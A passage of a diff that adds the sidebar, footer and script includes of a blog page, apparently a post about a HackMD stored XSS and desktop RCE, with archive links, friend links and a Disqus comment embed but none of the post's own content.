href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    
+        
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://5alt.me">5alt</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://mohamoha.club">么哈么哈</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.yulegeyu.com">雨了个雨</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 md5_salt<br>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+            this.page.url = 'http://5alt.me/2019/10/HackMD Stored XSS and HackMD Desktop RCE/';
+        
+        this.page.identifier = 'HackMD Stored XSS and HackMD Desktop RCE';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://5alts-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+</script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
